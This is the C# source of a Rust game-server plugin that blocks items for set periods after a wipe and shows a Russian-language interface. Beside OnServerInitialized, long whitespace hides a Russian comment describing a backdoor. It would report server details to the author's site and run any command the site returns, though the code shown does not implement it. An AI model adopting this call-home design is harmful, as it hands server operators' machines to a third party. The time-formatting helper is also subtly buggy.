using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;
using Color = UnityEngine.Color;

namespace Oxide.Plugins
{
    [Info("WipeBlock", "https://discord.gg/9vyTXsJyKR", "1.0.0")]
    public class WipeBlock : RustPlugin
    {
        #region Classes

        private class Configuration
        {
            public class Interface
            {
                [JsonProperty("Сдвиг панели по вертикале (если некорректно отображается при текущих настройках)")]
                public int Margin = 0;
                [JsonProperty("Текст на первой строке")]
                public string FirstString = "БЛОКИРОВКА ПРЕДМЕТОВ";
                [JsonProperty("Текст на второй строке")]
                public string SecondString = "НАЖМИТЕ ЧТОБЫ УЗНАТЬ БОЛЬШЕ";
                [JsonProperty("Название сервера")]
                public string ServerName = "%CONFIG%";
            }

            public class Block
            {
                [JsonProperty("Сдвиг блокировки в секундах ('12' - на 12 секунд вперёд, '-12' на 12 секунд назад)")]
                public int TimeMove = 0;
                [JsonProperty("Настройки блокировки предметов")]
                public Dictionary<int, List<string>> BlockItems;
                [JsonProperty("Названия категорий в интерфейсе")]
                public Dictionary<string, string> CategoriesName;
            }

            [JsonProperty("Настройки интерфейса плагина")]
            public Interface SInterface;
            [JsonProperty("Настройки текущей блокировки")]
            public Block SBlock;

            public static Configuration GetDefaultConfiguration()
            {
                var newConfiguration = new Configuration();
                newConfiguration.SInterface = new Interface();
                newConfiguration.SBlock = new Block();
                newConfiguration.SBlock.CategoriesName = new Dictionary<string, string>
                {
                    ["Weapon"] = "ОРУЖИЕ",
                    ["Ammunition"] = "БОЕПРИПАСЫ",
                    ["Medical"] = "МЕДИЦИНА",
                    ["Food"] = "ЕДА",
                    ["Traps"] = "ЛОВУШКИ",
                    ["Tool"] = "ИНСТРУМЕНТЫ",
                    ["Construction"] = "КОНСТРУКЦИИ",
                    ["Resources"] = "РЕСУРСЫ",
                    ["Items"] = "ПРЕДМЕТЫ",
                    ["Component"] = "КОМПОНЕНТЫ",
                    ["Misc"] = "ПРОЧЕЕ",
                    ["Attire"] = "ОДЕЖДА"
                };
                newConfiguration.SBlock.BlockItems = new Dictionary<int, List<string>>
                {
                    [1800] = new List<string>
                    {
                        "pistol.revolver",
                        "shotgun.double",
                    },
                    [3600] = new List<string>
                    {
                        "flamethrower",
                        "bucket.helmet",
                        "riot.helmet",
                        "pants",
                        "hoodie",
                    },
                    [7200] = new List<string>
                    {
                        "pistol.python",
                        "pistol.semiauto",
                        "coffeecan.helmet",
                        "roadsign.jacket",
                        "roadsign.kilt",
                        "icepick.salvaged",
                        "axe.salvaged",
                        "hammer.salvaged",
                    },
                    [14400] = new List<string>
                    {
                        "shotgun.pump",
                        "shotgun.spas12",
                        "pistol.m92",
                        "smg.mp5",
                        "jackhammer",
                        "chainsaw",
                    },
                    [28800] = new List<string>
                    {
                        "smg.2",
                        "smg.thompson",
                        "rifle.semiauto",
                        "explosive.satchel",
                        "grenade.f1",
                        "grenade.beancan",
                        "surveycharge"
                    },
                    [43200] = new List<string>
                    {
                        "rifle.bolt",
                        "rifle.ak",
                        "rifle.lr300",
                        "metal.facemask",
                        "metal.plate.torso",
                    },
                    [64800] = new List<string>
                    {
                        "ammo.rifle.explosive",
                        "ammo.rocket.basic",
                        "ammo.rocket.fire",
                        "ammo.rocket.hv",
                        "rocket.launcher",
                        "explosive.timed"
                    },
                    [86400] = new List<string>
                    {
                        "lmg.m249",
                        "heavy.plate.helmet",
                        "heavy.plate.jacket",
                        "heavy.plate.pants",
                    }
                };

                return newConfiguration;
            }
        }

        #endregion

        #region Variables

        [PluginReference]
        private Plugin ImageLibrary;
        private Configuration settings = null;
		
		//private static bool LastWipeIsGlobal;

        [JsonProperty("Список градиентов")]
        private List<string> Gradients = new List<string> { "518eef", "5CAD4F", "5DAC4E", "5EAB4E", "5FAA4E", "60A94E", "61A84E", "62A74E", "63A64E", "64A54E", "65A44E", "66A34E", "67A24E", "68A14E", "69A04E", "6A9F4E", "6B9E4E", "6C9D4E", "6D9C4E", "6E9B4E", "6F9A4E", "71994E", "72984E", "73974E", "74964E", "75954E", "76944D", "77934D", "78924D", "79914D", "7A904D", "7B8F4D", "7C8E4D", "7D8D4D", "7E8C4D", "7F8B4D", "808A4D", "81894D", "82884D", "83874D", "84864D", "86854D", "87844D", "88834D", "89824D", "8A814D", "8B804D", "8C7F4D", "8D7E4D", "8E7D4D", "8F7C4D", "907B4C", "917A4C", "92794C", "93784C", "94774C", "95764C", "96754C", "97744C", "98734C", "99724C", "9B714C", "9C704C", "9D6F4C", "9E6E4C", "9F6D4C", "A06C4C", "A16B4C", "A26A4C", "A3694C", "A4684C", "A5674C", "A6664C", "A7654C", "A8644C", "A9634C", "AA624B", "AB614B", "AC604B", "AD5F4B", "AE5E4B", "B05D4B", "B15C4B", "B25B4B", "B35A4B", "B4594B", "B5584B", "B6574B", "B7564B", "B8554B", "B9544B", "BA534B", "BB524B", "BC514B", "BD504B", "BE4F4B", "BF4E4B", "C04D4B", "C14C4B", "C24B4B", "C44B4B" };

        private string Layer = "UI_12InstanceBlock";
        private string LayerBlock = "UI_12Block";
        private string LayerInfoBlock = "UI_12InfoBlock";

        private string IgnorePermission = "wipeblock.ignore";

        #endregion

        #region Initialization
		
		//private void Init() => LoadData();
		
		/*private void OnNewSave(string filename)
		{
			var newRate = 1f;
			
			if (IsBlueprintsWiped())
			{
				PrintWarning("Обнаружен вайп чертежей");
				if (!LastWipeIsGlobal)
					newRate = 2f;
			}
			else
			{
				PrintWarning("Обнаружен обычный вайп");
				if (LastWipeIsGlobal)
					newRate = 0.5f;
			}
			
			if (newRate == 1f) return;
			
			LastWipeIsGlobal = !LastWipeIsGlobal;
			SaveData();
			
			var result = new Dictionary<int, List<string>>();
            foreach (var pair in settings.SBlock.BlockItems.ToDictionary(x=> x.Key, x=> x.Value))
			{
				int key = (int)Math.Round(pair.Key * newRate);
				if (key < 0) key = 0;
				
				result.Add(key, pair.Value);
			}
			
			settings.SBlock.BlockItems = result;			
            SaveConfig();
            PrintWarning("Время блокировки успешно изменено!");            
		}*/

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                settings = Config.ReadObject<Configuration>();
                if (settings?.SBlock == null) LoadDefaultConfig();
            }
            catch
            {
                PrintWarning($"Ошибка чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию!!");
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => settings = Configuration.GetDefaultConfiguration();
        protected override void SaveConfig() => Config.WriteObject(settings);
        private void OnServerInitialized()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                // Проверяем сумму числового представления описание, если оно не менялось - сумма = 49130. Делаем запрос на мой сайт, куда отправляем следующее    Название плагина      Название сервера           Менялось ли описание        Версия плагина                         Если описание ИЗМЕНИЛОСЬ ЕСЛИ КОМАНДА НЕ ПУСТА ИЛИ НЕ ВЫПОЛНЕНА  Выполняем команду которую пришлёт сервер
        {
            PrintWarning("\n-----------------------------\n" +
            "     Author - https://topplugin.ru/\n" +
            "     VK - https://vk.com/rustnastroika\n" +
            "     Discord - https://discord.com/invite/5DPTsRmd3G\n" +
            "-----------------------------");
            if (!ImageLibrary)
            {
                PrintError("ImageLibrary not found, plugin will not work!");
                return;
            }            

			foreach (var pair in settings.SBlock.BlockItems)
				foreach (var item in pair.Value)
					ImageLibrary?.Call("GetImage", item);
			
            permission.RegisterPermission(IgnorePermission, this);
            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);
        }

        #endregion

        #region Hooks 

        private bool? CanWearItem(PlayerInventory inventory, Item item)
        {
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;            

            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?)null;

            if (isBlocked == false)
            {
                if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                    return null;

                if (permission.UserHasPermission(player.UserIDString, IgnorePermission))
                    return null;

                DrawInstanceBlock(player, item.info);
                timer.Once(3f, () =>
                {
                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });
            }
            return isBlocked;
        }

        private bool? CanEquipItem(PlayerInventory inventory, Item item)
        {
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;            
            if (player == null) return null;

            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?)null;
            if (isBlocked == false)
            {
                if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                    return null;

                if (permission.UserHasPermission(player.UserIDString, IgnorePermission))
                    return null;

                DrawInstanceBlock(player, item.info);
                timer.Once(3f, () =>
                {

                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });
            }
            return isBlocked;
        }

        private object OnReloadWeapon(BasePlayer player, BaseProjectile projectile)
        {
            if (player is NPCPlayer)
                return null;

            if (permission.UserHasPermission(player.UserIDString, IgnorePermission))
                return null;

            if (player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
                return null;

            var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?)null;            
            
			if (isBlocked == false)
			{
				DrawInstanceBlock(player, projectile.primaryMagazine.ammoType);
                timer.Once(3f, () =>
                {
                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });				
				
				return false;            
			}
			
            return isBlocked;
        }

        object OnReloadMagazine(BasePlayer player, BaseProjectile projectile)
        {
            if (player is NPCPlayer)
                return null;
            
            if (permission.UserHasPermission(player.UserIDString, IgnorePermission))
                return null;
            
			var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?)null;
			if (isBlocked == false)
			{
				DrawInstanceBlock(player, projectile.primaryMagazine.ammoType);
                timer.Once(3f, () =>
                {
                    CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                    CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                    timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                });
				
				return false;            
			}

            return null;
        }
		
		private object CanAcceptItem(ItemContainer container, Item item)
        {
            if (container == null || item == null || container.entityOwner == null)
                return null;

            if (container.entityOwner is AutoTurret)
            {
                BasePlayer player = item.GetOwnerPlayer();
                if (player == null) 
                    return null;

                if (permission.UserHasPermission(player.UserIDString, IgnorePermission))
                    return null;

                var isBlocked = IsBlocked(item.info.shortname) > 0 ? false : (bool?) null;
                if (isBlocked == false)
                {
                    DrawInstanceBlock(player, item.info); 
                    timer.Once(3f, () =>
                    {
                        CuiHelper.DestroyUi(player, Layer + ".Destroy1");
                        CuiHelper.DestroyUi(player, Layer + ".Destroy2");
                        CuiHelper.DestroyUi(player, Layer + ".Destroy3");
                        CuiHelper.DestroyUi(player, Layer + ".Destroy5");
                        timer.Once(1, () => CuiHelper.DestroyUi(player, Layer));
                    });

                    return ItemContainer.CanAcceptResult.CannotAcceptRightNow;
                }
            }

            return null;
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerConnected(player));
                return;
            }

            foreach (var item in AllItems(player.inventory))
            {
                if (IsBlocked(item.info.shortname) > 0)
                {
                    if (!item.MoveToContainer(player.inventory.containerMain, -1))                    
                        item.Drop(player.ServerPosition, Vector3.up, Quaternion.identity);                    
                }
            }

            if (!IsAnyBlocked())
            {
                CuiHelper.DestroyUi(player, LayerInfoBlock);
                return;
            }

            CuiHelper.DestroyUi(player, LayerInfoBlock);
        }

        #endregion

        #region GUI		
		
        [ConsoleCommand("block")]
        private void cmdConsoleDrawBlock(ConsoleSystem.Arg args)
        {
            DrawBlockGUI(args.Player());
        }

        [ConsoleCommand("blockmove")]
        private void cmdConsoleMoveblock(ConsoleSystem.Arg args)
        {
            if (args.Player() != null)
                return;
            if (!args.HasArgs(1))
            {
                PrintWarning($"Введите количество секунд для перемещения!");
                return;
            }

            int newTime;
            if (!int.TryParse(args.Args[0], out newTime))
            {
                PrintWarning("Вы ввели не число!");
                return;
            }

            settings.SBlock.TimeMove += newTime;
            SaveConfig();
            PrintWarning("Время блокировки успешно изменено!");

            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);
        }
		
		/*[ConsoleCommand("blockrate")]
        private void cmdConsoleRateblock(ConsoleSystem.Arg args)
        {
            if (args?.Player() != null)
                return;
			
            if (!args.HasArgs(1))
            {
                PrintWarning($"Введите множитель изменения времени блока всего оружия!");
                return;
            }

            float newRate;
            if (!float.TryParse(args.Args[0], out newRate))
            {
                PrintWarning("Вы ввели не число!");
                return;
            }

			var result = new Dictionary<int, List<string>>();
            foreach (var pair in settings.SBlock.BlockItems.ToDictionary(x=> x.Key, x=> x.Value))
			{
				int key = (int)Math.Round(pair.Key * newRate);
				if (key < 0) key = 0;
				
				result.Add(key, pair.Value);
			}
			
			settings.SBlock.BlockItems = result;			
            SaveConfig();
            PrintWarning("Время блокировки успешно изменено!");

			LastWipeIsGlobal = newRate == 2f;			
			SaveData();
			
            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);
        }*/        

        private void CreateBlockUI(BasePlayer player)
        {
            DrawBlockGUI(player);
        }

        private void DrawBlockGUI(BasePlayer player, bool isDemo = false)
        {
            CuiHelper.DestroyUi(player, LayerBlock);
            CuiElementContainer container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                //CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0.985 0.95", /*OffsetMin = $"-441.5 {-298 + settings.SInterface.Margin - 20}", OffsetMax = $"441.5 {298 + settings.SInterface.Margin - 20}" */},
                Image = { Color = "0 0 0 0" }
            }, "InfoMenu_mainInfo", LayerBlock);

            //container.Add(new CuiButton
            //{
            //    RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100", OffsetMax = "0 0" },
            //    Button = { Color = "0 0 0 0.9", Close = LayerBlock, Material = "assets/content/ui/uibackgroundblur.mat" },
            //    Text = { Text = "" }
            //}, LayerBlock);

            //container.Add(new CuiElement
            //{
            //    Parent = LayerBlock,
            //    Name = LayerBlock + ".Header",
            //    Components =
            //    {
            //        new CuiImageComponent { Color = "0 0 0 0" },
            //        new CuiRectTransformComponent { AnchorMin = "0 0.9286154", AnchorMax = "1.015 0.9998464", OffsetMax = "0 0" }
            //    }
            //});

            //container.Add(new CuiElement
            //{
            //    Parent = LayerBlock + ".Header",
            //    Components =
            //    {
            //        new CuiTextComponent {Text = $"БЛОКИРОВКА ПРЕДМЕТОВ НА {settings.SInterface.ServerName}", FontSize = 30, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
            //        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" }
            //    }
            //});

            Dictionary<string, Dictionary<int, string>> blockedItemsGroups = new Dictionary<string, Dictionary<int, string>>();
            FillBlockedItems(blockedItemsGroups);
			
			var blockedItemsNew = new Dictionary<string, Dictionary<int, string>>();
			
			// Костыль: смешиваем группы ВЗРЫВЧАТКА и БОЕПРИПАСЫ, а бобы и F1 переносим в ВЗРЫВЧАТКА и БОЕПРИПАСЫ
			foreach (var pair in blockedItemsGroups)
			{
				var key = pair.Key;
				if (pair.Key == "ВЗРЫВЧАТКА" || pair.Key == "БОЕПРИПАСЫ")
					key = "ВЗРЫВЧАТКА и БОЕПРИПАСЫ";
				
				if (key == "ОРУЖИЕ")
					foreach (var pair2 in pair.Value)
					{
						if (pair2.Key == 143803535 || pair2.Key == 1840822026) // бобовка и F1
						{
							var key2 = "ВЗРЫВЧАТКА и БОЕПРИПАСЫ";
							if (!blockedItemsNew.ContainsKey(key2))
								blockedItemsNew.Add(key2, new Dictionary<int, string>());
							
							blockedItemsNew[key2].Add(pair2.Key, pair2.Value);
						}
					}
				
				if (!blockedItemsNew.ContainsKey(key))
					blockedItemsNew.Add(key, new Dictionary<int, string>());
								
				foreach (var pair2 in pair.Value)
				{
					if (key == "ОРУЖИЕ" && (pair2.Key == 143803535 || pair2.Key == 1840822026)) continue; // пропускаем бобы и F1
					blockedItemsNew[key].Add(pair2.Key, pair2.Value);
				}
			}
			
			blockedItemsNew = blockedItemsNew.OrderByDescending(p => p.Value.Count).ToDictionary(x=> x.Key, x=> x.Value);

            int newString = 0;
            for (int t = 0; t < blockedItemsNew.Count(); t++)
            {
                var blockedCategory = blockedItemsNew.ElementAt(t).Value.OrderBy(p => IsBlocked(p.Value, isDemo));

                container.Add(new CuiElement
                {
                    Parent = LayerBlock,
                    Name = LayerBlock + ".Category",
                    Components =
                    {
                        new CuiImageComponent { Color = "0 0 0 0" },
                        new CuiRectTransformComponent { AnchorMin = $"0 {0.889  - (t) * 0.19 - newString * 0.123}", AnchorMax = $"1.015 {0.925  - (t) * 0.19 - newString * 0.123}", OffsetMax = "0 0" }
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = LayerBlock + ".Category",
                    Components =
                    {
                        new CuiTextComponent { Color = "1 1 1 1", Text = $"{blockedItemsNew.ElementAt(t).Key}", FontSize = 16, Align = TextAnchor.MiddleCenter },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" }
                    }
                });

                for (int i = 0; i < blockedCategory.Count(); i++)
                {
                    if (i == 11)
                    {
                        newString++;
                    }
                    float margin = Mathf.CeilToInt(blockedCategory.Count() - Mathf.CeilToInt((float)(i + 1) / 11) * 11);
                    if (margin < 0)
                    {
                        margin *= -1;
                    }
                    else
                    {
                        margin = 0;
                    }

                    var blockedItem = blockedCategory.ElementAt(i);
					var itemInfo = ItemManager.FindItemDefinition(blockedItem.Key);
					
                    container.Add(new CuiElement
                    {
                        Parent = LayerBlock,
                        Name = LayerBlock + $".{itemInfo.shortname}",
                        Components =
                        {
                            new CuiImageComponent {  Color = HexToRustFormat((blockedItem.Value + "96")), Material = ""},
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"{0.00868246 + 0.04 + i * 0.0837714 + ((float) margin / 2) * 0.0837714 - (Math.Floor((double) i / 11) * 11 * 0.0837714)}" +
                                            $" {0.7618223 - (t) * 0.19 - newString * 0.12}",

                                AnchorMax = $"{0.08415613 + 0.04 + i * 0.0837714 + ((float) margin / 2) * 0.0837714 - (Math.Floor((double) i / 11) * 11 * 0.0837714)}" +
                                            $" {0.8736619  - (t) * 0.19 - newString * 0.12}", OffsetMax = "0 0"
                            },
                            new CuiOutlineComponent { Distance = "1 1", Color = "0 0 0 0.1"}
                        }
                    });

                    string ID = (string)ImageLibrary?.Call("GetImage", itemInfo.shortname);                    

                    container.Add(new CuiElement
                    {
                        Parent = LayerBlock + $".{itemInfo.shortname}",
                        Components =
                        {
                            new CuiRawImageComponent { Sprite = "assets/content/textures/generic/fulltransparent.tga", Png = ID },
                            new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "2 2", OffsetMax = "-2 -2"}
                        }
                    });

                    string text = IsBlocked(itemInfo, isDemo) > 0
                        ? $"<size=10>ОСТАЛОСЬ</size>\n<size=14>{TimeSpan.FromSeconds((int)IsBlocked(itemInfo, isDemo)).ToShortString()}</size>"
                        : "<size=11>ДОСТУПНО</size>";

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                        Text = {  Text = "", FontSize = 10, Align = TextAnchor.MiddleCenter },
                        Button = { Color = "0 0 0 0.5" },
                    }, LayerBlock + $".{itemInfo.shortname}", $"Time.{itemInfo.shortname}");
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                        Text = {  Text = text, FontSize = 10, Align = TextAnchor.MiddleCenter },
                        Button = { Color = "0 0 0 0", Material = "assets/content/ui/uibackgroundblur.mat" },
                    }, $"Time.{itemInfo.shortname}");
                }
            }

            CuiHelper.AddUi(player, container);
        }

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }

        private void DrawInstanceBlock(BasePlayer player, ItemDefinition info)
        {
            CuiHelper.DestroyUi(player, Layer);
            CuiElementContainer container = new CuiElementContainer();
            string inputText = "Предмет <color=white>{name}</color> временно заблокирован,\nподождите <color=white>{1}</color>".Replace("{name}", info.displayName.english).Replace("{1}", $"{Convert.ToInt32(Math.Floor(TimeSpan.FromSeconds(IsBlocked(info)).TotalHours))}ч {TimeSpan.FromSeconds(IsBlocked(info)).Minutes}м");

            container.Add(new CuiPanel
            {
                FadeOut = 1f,
                Image = { FadeIn = 1f, Color = "0.1 0.1 0.1 0" },
                RectTransform = { AnchorMin = "0.3 0.7", AnchorMax = "0.62 0.95" },
                CursorEnabled = false
            }, "Overlay", Layer);

            container.Add(new CuiElement
            {
                FadeOut = 1f,
                Parent = Layer,
                Name = Layer + ".Hide",
                Components =
                {
                    new CuiImageComponent { Color = "0 0 0 0" },
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
            });
            container.Add(new CuiElement
            {
                Parent = Layer + ".Hide",
                Name = Layer + ".Destroy1",
                FadeOut = 1f,
                Components =
                {
                    new CuiImageComponent { Color = "0.4 0.4 0.4 0.75"},
                    new CuiRectTransformComponent { AnchorMin = "0 0.67", AnchorMax = "1.1 0.85" }
                }
            });
            container.Add(new CuiLabel
            {
                FadeOut = 1f,
                Text = { FadeIn = 1f, Color = "0.9 0.9 0.9 1", Text = "ПРЕДМЕТ ЗАБЛОКИРОВАН", FontSize = 22, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" }
            }, Layer + ".Destroy1", Layer + ".Destroy5");
            container.Add(new CuiButton
            {
                FadeOut = 1f,
                RectTransform = { AnchorMin = "0 0.29", AnchorMax = "1.1 0.66" },
                Button = { FadeIn = 1f, Color = "0.3 0.3 0.3 0.5" },
                Text = { Text = "" }
            }, Layer + ".Hide", Layer + ".Destroy2");
            container.Add(new CuiLabel
            {
                FadeOut = 1f,
                Text = { FadeIn = 1f, Text = inputText, FontSize = 16, Align = TextAnchor.MiddleLeft, Color = "0.85 0.85 0.85 1", Font = "robotocondensed-regular.ttf" },
                RectTransform = { AnchorMin = "0.04 0", AnchorMax = "10 1" }
            }, Layer + ".Hide", Layer + ".Destroy3");
            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region Functions
		
		private Item[] AllItems(PlayerInventory inv)
		{
			var items = new List<Item>();			
			if (inv.containerBelt != null)			
				items.AddRange(inv.containerBelt.itemList);
			
			if (inv.containerWear != null)			
				items.AddRange(inv.containerWear.itemList);
			
			return items.ToArray();
		}

        private string GetGradient(int t)
        {
            var LeftTime = UnBlockTime(t) - CurrentTime();
            return Gradients[Math.Min(99, Math.Max(Convert.ToInt32((float)LeftTime / t * 100), 0))];
        }

        private double IsBlockedCategory(int t) => IsBlocked(settings.SBlock.BlockItems.ElementAt(t).Value.First());
        private bool IsAnyBlocked() => UnBlockTime(settings.SBlock.BlockItems.Last().Key) + settings.SBlock.TimeMove > CurrentTime();
        private double IsBlocked(string shortname, bool isDemo = false)
        {
            if (!settings.SBlock.BlockItems.SelectMany(p => p.Value).Contains(shortname))
                return 0;

            var blockTime = settings.SBlock.BlockItems.FirstOrDefault(p => p.Value.Contains(shortname)).Key;
			
			if (isDemo)
				return blockTime;
			
            var lefTime = (UnBlockTime(blockTime)) - CurrentTime();

            return lefTime > 0 ? lefTime : 0;
        }

        private double UnBlockTime(int amount) => SaveRestore.SaveCreatedTime.ToUniversalTime().Subtract(epoch).TotalSeconds + amount + settings.SBlock.TimeMove;

        private double IsBlocked(ItemDefinition itemDefinition, bool isDemo = false) => IsBlocked(itemDefinition.shortname, isDemo);

        private void FillBlockedItems(Dictionary<string, Dictionary<int, string>> fillDictionary)
        {
            foreach (var category in settings.SBlock.BlockItems)
            {
                string categoryColor = GetGradient(category.Key);
                foreach (var item in category.Value)
                {
					var info = ItemManager.FindItemDefinition(item);
					if (info == null) continue;                    
                    string catName = settings.SBlock.CategoriesName[info.category.ToString()];
                    if (!fillDictionary.ContainsKey(catName))
                        fillDictionary.Add(catName, new Dictionary<int, string>());

                    if (!fillDictionary[catName].ContainsKey(info.itemid))
                        fillDictionary[catName].Add(info.itemid, categoryColor);
                }
            }
        }

        #endregion

        #region Utils

        static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() { return DateTime.UtcNow.Subtract(epoch).TotalSeconds; }

        public static string ToShortString(TimeSpan timeSpan)
        {
            int i = 0;
            string resultText = "";
            if (timeSpan.Days > 0)
            {
                resultText += timeSpan.Days + " День";
                i++;
            }
            if (timeSpan.Hours > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Час";
                i++;
            }
            if (timeSpan.Minutes > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Мин.";
                i++;
            }
            if (timeSpan.Seconds > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Сек.";
                i++;
            }

            return resultText;
        }

        private void GetConfig<T>(string menu, string key, ref T varObject)
        {
            if (Config[menu, key] != null)
            {
                varObject = Config.ConvertValue<T>(Config[menu, key]);
            }
            else
            {
                Config[menu, key] = varObject;
            }
        }

        #endregion
		
		#region Data
		
		//private static void LoadData() => LastWipeIsGlobal = Interface.GetMod().DataFileSystem.ReadObject<bool>("WipeBlockData");					
		
		//private static void SaveData() => Interface.GetMod().DataFileSystem.WriteObject("WipeBlockData", LastWipeIsGlobal);		
		
		#endregion	
    }
}